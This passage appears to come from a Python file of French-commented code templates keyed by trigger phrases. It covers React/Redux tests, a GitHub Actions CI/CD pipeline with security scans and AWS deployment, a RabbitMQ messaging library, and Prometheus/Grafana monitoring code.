    expect(screen.getByText('Jane Smith')).toBeInTheDocument();
  });
  
  it('shows error message on API failure', async () => {
    server.use(
      rest.get('/api/users', (req, res, ctx) => {
        return res(ctx.status(500));
      })
    );
    
    renderWithProviders(<UserList />);
    
    await waitFor(() => {
      expect(screen.getByText(/error loading users/i)).toBeInTheDocument();
    });
  });
});

// ========================================
// TESTS AVEC REDUX
// ========================================

// UserSlice.test.ts
import userReducer, { fetchUsers, addUser } from '@/store/userSlice';

describe('User Slice', () => {
  const initialState = {
    users: [],
    loading: false,
    error: null
  };
  
  it('handles fetchUsers.pending', () => {
    const state = userReducer(initialState, fetchUsers.pending);
    expect(state.loading).toBe(true);
  });
  
  it('handles fetchUsers.fulfilled', () => {
    const users = [{ id: 1, name: 'John' }];
    const state = userReducer(initialState, fetchUsers.fulfilled(users, ''));
    
    expect(state.loading).toBe(false);
    expect(state.users).toEqual(users);
  });
  
  it('handles addUser', () => {
    const newUser = { id: 2, name: 'Jane' };
    const state = userReducer(
      { ...initialState, users: [{ id: 1, name: 'John' }] },
      addUser(newUser)
    );
    
    expect(state.users).toHaveLength(2);
    expect(state.users[1]).toEqual(newUser);
  });
});

// ========================================
// TESTS DE SNAPSHOT
// ========================================

import renderer from 'react-test-renderer';

it('matches snapshot', () => {
  const tree = renderer.create(<Button>Click me</Button>).toJSON();
  expect(tree).toMatchSnapshot();
});

// ========================================
// TESTS D'ACCESSIBILITÉ
// ========================================

import { axe, toHaveNoViolations } from 'jest-axe';

expect.extend(toHaveNoViolations);

it('has no accessibility violations', async () => {
  const { container } = render(<LoginForm onSubmit={jest.fn()} />);
  const results = await axe(container);
  expect(results).toHaveNoViolations();
});

// Lancer les tests:
// npm test
// npm test -- --coverage
// npm test -- --watch
// npm test -- --updateSnapshot
"""
    },

    # ========================================
    # CI/CD - GITHUB ACTIONS
    # ========================================
    
    "github_actions_complete": {
        "patterns": ["github actions", "ci/cd", "workflow", "deployment pipeline", "continuous integration"],
        "template": """
# ========================================
# GITHUB ACTIONS - WORKFLOWS COMPLETS
# ========================================

# .github/workflows/ci.yml
name: CI/CD Pipeline

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  schedule:
    # Runs at 00:00 UTC every day
    - cron: '0 0 * * *'
  workflow_dispatch:

env:
  NODE_VERSION: '18.x'
  PYTHON_VERSION: '3.11'
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  # ========================================
  # LINTING & CODE QUALITY
  # ========================================
  
  lint:
    name: Lint Code
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: ${{ env.PYTHON_VERSION }}
          cache: 'pip'
          
      - name: Install dependencies
        run: |
          pip install flake8 black isort mypy pylint
          pip install -r requirements.txt
          
      - name: Run Black
        run: black --check .
        
      - name: Run isort
        run: isort --check-only .
        
      - name: Run Flake8
        run: flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics
        
      - name: Run MyPy
        run: mypy app/
        continue-on-error: true
        
      - name: Run Pylint
        run: pylint app/ --fail-under=8.0
        
      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
          
      - name: Install Node dependencies
        run: npm ci
        
      - name: Run ESLint
        run: npm run lint
        
      - name: Run Prettier
        run: npm run format:check

  # ========================================
  # SECURITY SCANNING
  # ========================================
  
  security:
    name: Security Scan
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-results.sarif'
          
      - name: Upload Trivy results to GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: 'trivy-results.sarif'
          
      - name: Run Bandit security check
        run: |
          pip install bandit
          bandit -r app/ -f json -o bandit-report.json
          
      - name: Run npm audit
        run: npm audit --audit-level=moderate
        continue-on-error: true
        
      - name: Check for secrets
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD

  # ========================================
  # TESTS UNITAIRES
  # ========================================
  
  test:
    name: Run Tests
    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        python-version: ['3.10', '3.11', '3.12']
        
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: test_db
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432
          
      redis:
        image: redis:7
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 6379:6379
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Set up Python ${{ matrix.python-version }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
          cache: 'pip'
          
      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install pytest pytest-cov pytest-asyncio
          
      - name: Run pytest
        env:
          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/test_db
          REDIS_URL: redis://localhost:6379
        run: |
          pytest --cov=app --cov-report=xml --cov-report=html --cov-report=term
          
      - name: Upload coverage to Codecov
        uses: codecov/codecov-action@v4
        with:
          token: ${{ secrets.CODECOV_TOKEN }}
          files: ./coverage.xml
          flags: unittests
          name: codecov-${{ matrix.python-version }}
          
      - name: Archive coverage report
        uses: actions/upload-artifact@v4
        with:
          name: coverage-report-${{ matrix.python-version }}
          path: htmlcov/
          retention-days: 30

  # ========================================
  # TESTS FRONTEND
  # ========================================
  
  test-frontend:
    name: Frontend Tests
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
          
      - name: Install dependencies
        run: npm ci
        
      - name: Run Jest tests
        run: npm test -- --coverage --watchAll=false
        
      - name: Upload coverage
        uses: codecov/codecov-action@v4
        with:
          token: ${{ secrets.CODECOV_TOKEN }}
          files: ./coverage/coverage-final.json
          flags: frontend

  # ========================================
  # TESTS E2E
  # ========================================
  
  test-e2e:
    name: E2E Tests
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
          
      - name: Install dependencies
        run: npm ci
        
      - name: Install Playwright
        run: npx playwright install --with-deps
        
      - name: Build application
        run: npm run build
        
      - name: Run Playwright tests
        run: npx playwright test
        
      - name: Upload Playwright report
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: playwright-report
          path: playwright-report/
          retention-days: 30

  # ========================================
  # BUILD DOCKER IMAGE
  # ========================================
  
  build:
    name: Build Docker Image
    runs-on: ubuntu-latest
    needs: [lint, test, test-frontend]
    permissions:
      contents: read
      packages: write
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3
        
      - name: Log in to GitHub Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
          
      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=ref,event=branch
            type=ref,event=pr
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
            type=sha
            
      - name: Build and push Docker image
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          
      - name: Run Trivy on Docker image
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
          format: 'sarif'
          output: 'trivy-image-results.sarif'

  # ========================================
  # DEPLOY TO STAGING
  # ========================================
  
  deploy-staging:
    name: Deploy to Staging
    runs-on: ubuntu-latest
    needs: [build, security]
    if: github.ref == 'refs/heads/develop'
    environment:
      name: staging
      url: https://staging.example.com
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: us-east-1
          
      - name: Deploy to ECS
        run: |
          aws ecs update-service \\
            --cluster staging-cluster \\
            --service app-service \\
            --force-new-deployment
            
      - name: Wait for deployment
        run: |
          aws ecs wait services-stable \\
            --cluster staging-cluster \\
            --services app-service
            
      - name: Run smoke tests
        run: |
          curl -f https://staging.example.com/health || exit 1
          
      - name: Notify Slack
        uses: slackapi/slack-github-action@v1
        with:
          webhook-url: ${{ secrets.SLACK_WEBHOOK }}
          payload: |
            {
              "text": "✅ Deployment to staging successful!",
              "blocks": [
                {
                  "type": "section",
                  "text": {
                    "type": "mrkdwn",
                    "text": "*Deployment Status:* Success\\n*Environment:* Staging\\n*Commit:* ${{ github.sha }}"
                  }
                }
              ]
            }

  # ========================================
  # DEPLOY TO PRODUCTION
  # ========================================
  
  deploy-production:
    name: Deploy to Production
    runs-on: ubuntu-latest
    needs: [build, security, test-e2e]
    if: github.ref == 'refs/heads/main'
    environment:
      name: production
      url: https://example.com
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: us-east-1
          
      - name: Create database backup
        run: |
          aws rds create-db-snapshot \\
            --db-instance-identifier prod-db \\
            --db-snapshot-identifier backup-${{ github.sha }}
            
      - name: Deploy to ECS with blue/green
        run: |
          aws deploy create-deployment \\
            --application-name myapp \\
            --deployment-group-name prod-deployment-group \\
            --deployment-config-name CodeDeployDefault.ECSAllAtOnce \\
            --description "Deployment of commit ${{ github.sha }}"
            
      - name: Monitor deployment
        run: |
          deployment_id=$(aws deploy list-deployments --query 'deployments[0]' --output text)
          aws deploy wait deployment-successful --deployment-id $deployment_id
          
      - name: Run post-deployment tests
        run: |
          curl -f https://example.com/health || exit 1
          curl -f https://example.com/api/status || exit 1
          
      - name: Rollback on failure
        if: failure()
        run: |
          aws ecs update-service \\
            --cluster prod-cluster \\
            --service app-service \\
            --task-definition previous-task-definition
            
      - name: Create GitHub Release
        if: startsWith(github.ref, 'refs/tags/')
        uses: actions/create-release@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          tag_name: ${{ github.ref }}
          release_name: Release ${{ github.ref }}
          draft: false
          prerelease: false

# ========================================
# .github/workflows/dependency-update.yml
# ========================================

name: Dependency Update

on:
  schedule:
    - cron: '0 0 * * 1'  # Every Monday
  workflow_dispatch:

jobs:
  update-dependencies:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'
          
      - name: Update Python dependencies
        run: |
          pip install pip-tools
          pip-compile --upgrade requirements.in
          
      - name: Update Node dependencies
        run: |
          npm update
          npm audit fix
          
      - name: Create Pull Request
        uses: peter-evans/create-pull-request@v6
        with:
          commit-message: 'chore: update dependencies'
          title: 'chore: update dependencies'
          body: 'Automated dependency updates'
          branch: dependency-updates
          delete-branch: true
"""
    },

    # ========================================
    # MESSAGE QUEUES - RABBITMQ
    # ========================================
    
    "rabbitmq_complete": {
        "patterns": ["rabbitmq", "message queue", "amqp", "producer consumer", "pub sub"],
        "template": """
# ========================================
# RABBITMQ - SYSTÈME COMPLET DE MESSAGING
# ========================================

import pika
import json
import time
import logging
from typing import Callable, Dict, Any, Optional
from dataclasses import dataclass, asdict
from datetime import datetime
from enum import Enum
import threading
from contextlib import contextmanager

# ========================================
# CONFIGURATION
# ========================================

@dataclass
class RabbitMQConfig:
    host: str = 'localhost'
    port: int = 5672
    username: str = 'guest'
    password: str = 'guest'
    virtual_host: str = '/'
    heartbeat: int = 600
    blocked_connection_timeout: int = 300

class ExchangeType(Enum):
    DIRECT = 'direct'
    TOPIC = 'topic'
    FANOUT = 'fanout'
    HEADERS = 'headers'

# ========================================
# CONNECTION MANAGER
# ========================================

class RabbitMQConnectionManager:
    '''Gestionnaire de connexions RabbitMQ avec reconnexion automatique'''
    
    def __init__(self, config: RabbitMQConfig):
        self.config = config
        self.connection: Optional[pika.BlockingConnection] = None
        self.channel: Optional[pika.channel.Channel] = None
        self._lock = threading.Lock()
        self.logger = logging.getLogger(__name__)
        
    def connect(self) -> pika.BlockingConnection:
        '''Établir une connexion à RabbitMQ'''
        credentials = pika.PlainCredentials(
            self.config.username,
            self.config.password
        )
        
        parameters = pika.ConnectionParameters(
            host=self.config.host,
            port=self.config.port,
            virtual_host=self.config.virtual_host,
            credentials=credentials,
            heartbeat=self.config.heartbeat,
            blocked_connection_timeout=self.config.blocked_connection_timeout
        )
        
        try:
            self.connection = pika.BlockingConnection(parameters)
            self.channel = self.connection.channel()
            self.logger.info(f"Connected to RabbitMQ at {self.config.host}:{self.config.port}")
            return self.connection
        except Exception as e:
            self.logger.error(f"Failed to connect to RabbitMQ: {e}")
            raise
            
    def ensure_connection(self):
        '''S'assurer que la connexion est active'''
        with self._lock:
            if self.connection is None or self.connection.is_closed:
                self.connect()
            if self.channel is None or self.channel.is_closed:
                self.channel = self.connection.channel()
                
    def close(self):
        '''Fermer la connexion'''
        if self.channel and not self.channel.is_closed:
            self.channel.close()
        if self.connection and not self.connection.is_closed:
            self.connection.close()
        self.logger.info("RabbitMQ connection closed")

# ========================================
# MESSAGE PRODUCER
# ========================================

class MessageProducer:
    '''Producteur de messages avec support des échanges et routing keys'''
    
    def __init__(self, connection_manager: RabbitMQConnectionManager):
        self.conn_manager = connection_manager
        self.logger = logging.getLogger(__name__)
        
    def declare_exchange(
        self,
        exchange: str,
        exchange_type: ExchangeType = ExchangeType.DIRECT,
        durable: bool = True
    ):
        '''Déclarer un échange'''
        self.conn_manager.ensure_connection()
        self.conn_manager.channel.exchange_declare(
            exchange=exchange,
            exchange_type=exchange_type.value,
            durable=durable
        )
        self.logger.info(f"Exchange '{exchange}' declared as {exchange_type.value}")
        
    def send_message(
        self,
        exchange: str,
        routing_key: str,
        message: Dict[str, Any],
        properties: Optional[pika.BasicProperties] = None
    ):
        '''Envoyer un message'''
        self.conn_manager.ensure_connection()
        
        if properties is None:
            properties = pika.BasicProperties(
                delivery_mode=2,  # Message persistant
                content_type='application/json',
                timestamp=int(time.time())
            )
            
        body = json.dumps(message)
        
        try:
            self.conn_manager.channel.basic_publish(
                exchange=exchange,
                routing_key=routing_key,
                body=body,
                properties=properties
            )
            self.logger.info(f"Message sent to {exchange}/{routing_key}")
        except Exception as e:
            self.logger.error(f"Failed to send message: {e}")
            raise
            
    def send_batch(
        self,
        exchange: str,
        messages: list[tuple[str, Dict[str, Any]]]
    ):
        '''Envoyer plusieurs messages en batch'''
        self.conn_manager.ensure_connection()
        
        for routing_key, message in messages:
            self.send_message(exchange, routing_key, message)
            
        self.logger.info(f"Sent batch of {len(messages)} messages")

# ========================================
# MESSAGE CONSUMER
# ========================================

class MessageConsumer:
    '''Consommateur de messages avec ACK manuel et retry'''
    
    def __init__(
        self,
        connection_manager: RabbitMQConnectionManager,
        queue: str,
        prefetch_count: int = 1
    ):
        self.conn_manager = connection_manager
        self.queue = queue
        self.prefetch_count = prefetch_count
        self.logger = logging.getLogger(__name__)
        self.handlers: Dict[str, Callable] = {}
        
    def declare_queue(
        self,
        durable: bool = True,
        exclusive: bool = False,
        auto_delete: bool = False,
        arguments: Optional[Dict] = None
    ):
        '''Déclarer une queue'''
        self.conn_manager.ensure_connection()
        
        if arguments is None:
            # Dead letter exchange pour les messages échoués
            arguments = {
                'x-dead-letter-exchange': 'dlx',
                'x-dead-letter-routing-key': f'dlq.{self.queue}'
            }
            
        self.conn_manager.channel.queue_declare(
            queue=self.queue,
            durable=durable,
            exclusive=exclusive,
            auto_delete=auto_delete,
            arguments=arguments
        )
        self.logger.info(f"Queue '{self.queue}' declared")
        
    def bind_queue(
        self,
        exchange: str,
        routing_keys: list[str]
    ):
        '''Lier la queue à un échange avec des routing keys'''
        self.conn_manager.ensure_connection()
        
        for routing_key in routing_keys:
            self.conn_manager.channel.queue_bind(
                queue=self.queue,
                exchange=exchange,
                routing_key=routing_key
            )
            self.logger.info(f"Queue '{self.queue}' bound to {exchange}/{routing_key}")
            
    def register_handler(self, message_type: str, handler: Callable):
        '''Enregistrer un handler pour un type de message'''
        self.handlers[message_type] = handler
        self.logger.info(f"Handler registered for message type: {message_type}")
        
    def _process_message(
        self,
        channel: pika.channel.Channel,
        method: pika.spec.Basic.Deliver,
        properties: pika.BasicProperties,
        body: bytes
    ):
        '''Traiter un message reçu'''
        try:
            message = json.loads(body)
            message_type = message.get('type', 'unknown')
            
            self.logger.info(f"Processing message type: {message_type}")
            
            # Trouver le handler approprié
            handler = self.handlers.get(message_type)
            if handler:
                handler(message)
                channel.basic_ack(delivery_tag=method.delivery_tag)
                self.logger.info(f"Message processed and ACKed")
            else:
                self.logger.warning(f"No handler for message type: {message_type}")
                channel.basic_nack(
                    delivery_tag=method.delivery_tag,
                    requeue=False
                )
                
        except json.JSONDecodeError as e:
            self.logger.error(f"Invalid JSON message: {e}")
            channel.basic_nack(delivery_tag=method.delivery_tag, requeue=False)
        except Exception as e:
            self.logger.error(f"Error processing message: {e}")
            # Rejeter le message et le renvoyer dans la queue pour retry
            channel.basic_nack(delivery_tag=method.delivery_tag, requeue=True)
            
    def start_consuming(self):
        '''Démarrer la consommation de messages'''
        self.conn_manager.ensure_connection()
        
        # Configuration du prefetch
        self.conn_manager.channel.basic_qos(prefetch_count=self.prefetch_count)
        
        # Enregistrer le callback
        self.conn_manager.channel.basic_consume(
            queue=self.queue,
            on_message_callback=self._process_message,
            auto_ack=False
        )
        
        self.logger.info(f"Started consuming from queue: {self.queue}")
        
        try:
            self.conn_manager.channel.start_consuming()
        except KeyboardInterrupt:
            self.logger.info("Stopping consumer...")
            self.conn_manager.channel.stop_consuming()
        except Exception as e:
            self.logger.error(f"Consumer error: {e}")
            raise
            
    def stop_consuming(self):
        '''Arrêter la consommation'''
        if self.conn_manager.channel:
            self.conn_manager.channel.stop_consuming()

# ========================================
# WORKER POOL
# ========================================

class WorkerPool:
    '''Pool de workers pour traiter les messages en parallèle'''
    
    def __init__(
        self,
        config: RabbitMQConfig,
        queue: str,
        num_workers: int = 4
    ):
        self.config = config
        self.queue = queue
        self.num_workers = num_workers
        self.workers: list[threading.Thread] = []
        self.handlers: Dict[str, Callable] = {}
        self.logger = logging.getLogger(__name__)
        
    def register_handler(self, message_type: str, handler: Callable):
        '''Enregistrer un handler'''
        self.handlers[message_type] = handler
        
    def _worker_thread(self, worker_id: int):
        '''Thread de worker'''
        conn_manager = RabbitMQConnectionManager(self.config)
        consumer = MessageConsumer(conn_manager, self.queue)
        
        # Copier les handlers
        for msg_type, handler in self.handlers.items():
            consumer.register_handler(msg_type, handler)
            
        consumer.declare_queue()
        
        self.logger.info(f"Worker {worker_id} started")
        consumer.start_consuming()
        
    def start(self):
        '''Démarrer le pool de workers'''
        for i in range(self.num_workers):
            worker = threading.Thread(
                target=self._worker_thread,
                args=(i,),
                daemon=True
            )
            worker.start()
            self.workers.append(worker)
            
        self.logger.info(f"Started {self.num_workers} workers")
        
        # Attendre que tous les workers se terminent
        for worker in self.workers:
            worker.join()

# ========================================
# EXEMPLE D'UTILISATION
# ========================================

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    config = RabbitMQConfig(host='localhost')
    
    # PRODUCTEUR
    conn_manager = RabbitMQConnectionManager(config)
    producer = MessageProducer(conn_manager)
    
    producer.declare_exchange('tasks', ExchangeType.TOPIC)
    
    # Envoyer des messages
    producer.send_message(
        exchange='tasks',
        routing_key='email.send',
        message={
            'type': 'email',
            'to': 'user@example.com',
            'subject': 'Hello',
            'body': 'Test message'
        }
    )
    
    # CONSOMMATEUR
    def handle_email(message):
        print(f"Sending email to {message['to']}")
        time.sleep(1)  # Simuler l'envoi
        
    consumer = MessageConsumer(conn_manager, 'email_queue')
    consumer.declare_queue()
    consumer.bind_queue('tasks', ['email.*'])
    consumer.register_handler('email', handle_email)
    
    consumer.start_consuming()
"""
    },

    # ========================================
    # MONITORING - PROMETHEUS & GRAFANA
    # ========================================
    
    "prometheus_monitoring": {
        "patterns": ["prometheus", "monitoring", "metrics", "grafana", "observability"],
        "template": """
# ========================================
# PROMETHEUS & GRAFANA - MONITORING COMPLET
# ========================================

from prometheus_client import (
    Counter, Gauge, Histogram, Summary,
    CollectorRegistry, generate_latest,
    make_wsgi_app, Info, Enum
)
from flask import Flask, Response
import time
import functools
import logging
from typing import Callable
from dataclasses import dataclass
import psutil
import os

# ========================================
# MÉTRIQUES PERSONNALISÉES
# ========================================

# Compteurs
http_requests_total = Counter(
    'http_requests_total',
    'Total HTTP requests',
    ['method', 'endpoint', 'status']
)

http_request_duration_seconds = Histogram(
    'http_request_duration_seconds',
    'HTTP request duration in seconds',
    ['method', 'endpoint'],
    buckets=(0.005, 0.01, 0.025, 0.05, 0.075, 0.1, 0.25, 0.5, 0.75, 1.0, 2.5, 5.0, 7.5, 10.0)
)

active_users = Gauge(
    'active_users',
    'Number of active users',
    ['user_type']
)

database_connections = Gauge(
    'database_connections_total',
    'Total number of database connections',
    ['state']
)

task_processing_duration = Summary(
    'task_processing_duration_seconds',
    'Time spent processing tasks',
    ['task_type']
)

cache_hits = Counter(
    'cache_hits_total',
    'Total cache hits',
    ['cache_name']
)

cache_misses = Counter(
    'cache_misses_total',
    'Total cache misses',
    ['cache_name']
)

error_rate = Counter(
    'application_errors_total',
    'Total application errors',
    ['error_type', 'severity']
)

# Info metrics
app_info = Info(
    'application',
    'Application information'
)
app_info.info({
    'version': '1.0.0',
    'environment': 'production',
    'build_date': '2024-01-01'
})

# Enum metrics
deployment_status = Enum(
    'deployment_status',
    'Current deployment status',
    states=['pending', 'in_progress', 'completed', 'failed']
)

# ========================================
# DÉCORATEURS POUR INSTRUMENTATION
# ========================================

def track_request_metrics(func: Callable) -> Callable:
    '''Décorateur pour tracker les métriques HTTP'''
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        method = request.method
        endpoint = request.endpoint or 'unknown'
        
        # Démarrer le timer
        start_time = time.time()
        
        try:
            response = func(*args, **kwargs)
            status = response.status_code
            http_requests_total.labels(method=method, endpoint=endpoint, status=status).inc()
            return response
        except Exception as e:
            http_requests_total.labels(method=method, endpoint=endpoint, status=500).inc()
            error_rate.labels(error_type=type(e).__name__, severity='high').inc()
            raise
        finally:
            # Enregistrer la durée
            duration = time.time() - start_time
            http_request_duration_seconds.labels(method=method, endpoint=endpoint).observe(duration)
            
    return wrapper

def track_task_duration(task_type: str):
    '''Décorateur pour tracker la durée des tâches'''
    def decorator(func: Callable) -> Callable:
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            with task_processing_duration.labels(task_type=task_type).time():
                return func(*args, **kwargs)
        return wrapper
    return decorator

# ========================================
# COLLECTEURS PERSONNALISÉS
# ========================================

class SystemMetricsCollector:
    '''Collecteur de métriques système'''
    
    def __init__(self):
        self.cpu_usage = Gauge('system_cpu_usage_percent', 'CPU usage percentage')
        self.memory_usage = Gauge('system_memory_usage_percent', 'Memory usage percentage')
        self.disk_usage = Gauge('system_disk_usage_percent', 'Disk usage percentage', ['mount'])
        self.network_io = Counter('system_network_io_bytes', 'Network I/O in bytes', ['direction'])
        
    def collect_metrics(self):
        '''Collecter les métriques système'''
        # CPU
        self.cpu_usage.set(psutil.cpu_percent(interval=1))
        
        # Mémoire
        memory = psutil.virtual_memory()
        self.memory_usage.set(memory.percent)
        
        # Disque
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                self.disk_usage.labels(mount=partition.mountpoint).set(usage.percent)
            except PermissionError:
                pass
                
        # Réseau
        net_io = psutil.net_io_counters()
        self.network_io.labels(direction='sent').inc(net_io.bytes_sent)
        self.network_io.labels(direction='received').inc(net_io.bytes_recv)

class DatabaseMetricsCollector:
    '''Collecteur de métriques de base de données'''
    
    def __init__(self, db_engine):
        self.db_engine = db_engine
        self.query_duration = Histogram(
            'database_query_duration_seconds',
            'Database query duration',
            ['query_type']
        )
        self.active_transactions = Gauge(
            'database_active_transactions',
            'Number of active transactions'
        )
        self.table_size = Gauge(
            'database_table_size_bytes',
            'Size of database tables',
            ['table_name']
        )
        
    def collect_metrics(self):
        '''Collecter les métriques de base de données'''
        # Connexions actives
        pool = self.db_engine.pool
        database_connections.labels(state='active').set(pool.checkedout())
        database_connections.labels(state='idle').set(pool.size() - pool.checkedout())
        
        # Taille des tables (exemple PostgreSQL)
        with self.db_engine.connect() as conn:
            result = conn.execute(\"\"\"
                SELECT table_name, pg_total_relation_size(quote_ident(table_name))
                FROM information_schema.tables
                WHERE table_schema = 'public'
            \"\"\")
            
            for row in result:
                self.table_size.labels(table_name=row[0]).set(row[1])

# ========================================
# APPLICATION FLASK AVEC MONITORING
# ========================================

from flask import Flask, request, jsonify
import random

app = Flask(__name__)

# Endpoint pour Prometheus
app.wsgi_app = DispatcherMiddleware(app.wsgi_app, {
    '/metrics': make_wsgi_app()
})

# Collecteurs
system_collector = SystemMetricsCollector()

@app.before_request
def before_request():
    '''Enregistrer le temps de début de requête'''
    request.start_time = time.time()

@app.after_request
def after_request(response):
    '''Enregistrer les métriques après chaque requête'''
    duration = time.time() - request.start_time
    
    http_request_duration_seconds.labels(
        method=request.method,
        endpoint=request.endpoint or 'unknown'
    ).observe(duration)
    
    http_requests_total.labels(
        method=request.method,
        endpoint=request.endpoint or 'unknown',
        status=response.status_code
    ).inc()
    
    return response

@app.route('/api/users', methods=['GET'])
def get_users():
    '''Exemple d'endpoint avec monitoring'''
    # Simuler une requête BD
    time.sleep(random.uniform(0.01, 0.1))
    
    users = [
        {"id": 1, "name": "John"},
        {"id": 2, "name": "Jane"}
    ]
    
    # Mettre à jour le nombre d'utilisateurs actifs
    active_users.labels(user_type='registered').set(len(users))
    
    return jsonify(users)

@app.route('/api/cache/<key>')
def get_cache(key):
    '''Exemple avec métriques de cache'''
    # Simuler une vérification de cache
    if random.random() < 0.7:  # 70% hit rate
        cache_hits.labels(cache_name='redis').inc()
        return jsonify({"value": "cached_value"})
    else:
        cache_misses.labels(cache_name='redis').inc()
        return jsonify({"value": "fetched_value"})

@app.route('/health')
def health_check():
    '''Health check endpoint'''
    return jsonify({"status": "healthy", "timestamp": time.time()})

# Task avec monitoring
@track_task_duration('email_sending')
def send_email(to: str, subject: str, body: str):
    '''Envoyer un email avec monitoring'''
    time.sleep(random.uniform(0.5, 2.0))  # Simuler l'envoi
    print(f"Email sent to {to}")

# ========================================
# CONFIGURATION PROMETHEUS (prometheus.yml)
# ========================================

prometheus_config = \"\"\"
global:
  scrape_interval: 15s
  evaluation_interval: 15s
  external_labels:
    cluster: 'production'
    region: 'us-east-1'

alerting:
  alertmanagers:
    - static_configs:
        - targets: ['alertmanager:9093']

rule_files:
  - 'alerts.yml'

scrape_configs:
  - job_name: 'flask-app'
    static_configs:
      - targets: ['app:5000']
        labels:
          service: 'api'
          environment: 'production'
    
  - job_name: 'node-exporter'
    static_configs:
      - targets: ['node-exporter:9100']
    
  - job_name: 'postgres-exporter'
    static_configs:
      - targets: ['postgres-exporter:9187']
    
  - job_name: 'redis-exporter'
    static_configs:
      - targets: ['redis-exporter:9121']
\"\"\"

# ========================================
# RÈGLES D'ALERTE (alerts.yml)
# ========================================

alert_rules = \"\"\"
groups:
  - name: application_alerts
    interval: 30s
    rules:
      # Taux d'erreur élevé
      - alert: HighErrorRate
        expr: |
          rate(http_requests_total{status=~"5.."}[5m]) > 0.05
        for: 5m
        labels:
          severity: critical
        annotations:
          summary: "High error rate detected"
          description: "Error rate is {{ $value }} errors/sec"
      
      # Latence élevée
      - alert: HighLatency
        expr: |
          histogram_quantile(0.95, 
            rate(http_request_duration_seconds_bucket[5m])
          ) > 1.0
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "High request latency"
          description: "P95 latency is {{ $value }}s"
      
      # CPU élevé
      - alert: HighCPUUsage
        expr: system_cpu_usage_percent > 80
        for: 10m
        labels:
          severity: warning
        annotations:
          summary: "High CPU usage"
          description: "CPU usage is {{ $value }}%"
      
      # Mémoire élevée
      - alert: HighMemoryUsage
        expr: system_memory_usage_percent > 85
        for: 10m
        labels:
          severity: critical
        annotations:
          summary: "High memory usage"
          description: "Memory usage is {{ $value }}%"
      
      # Service down
      - alert: ServiceDown
        expr: up == 0
        for: 2m
        labels:
          severity: critical
        annotations:
          summary: "Service {{ $labels.job }} is down"
\"\"\"

# ========================================
# DASHBOARD GRAFANA (JSON)
# ========================================

grafana_dashboard = {
    "dashboard": {
        "title": "Application Monitoring",
        "panels": [
            {
                "title": "Request Rate",
                "targets": [
                    {
                        "expr": "rate(http_requests_total[5m])",
                        "legendFormat": "{{method}} {{endpoint}}"
                    }
                ],
                "type": "graph"
            },
            {
                "title": "Response Time (P95)",
                "targets": [
                    {
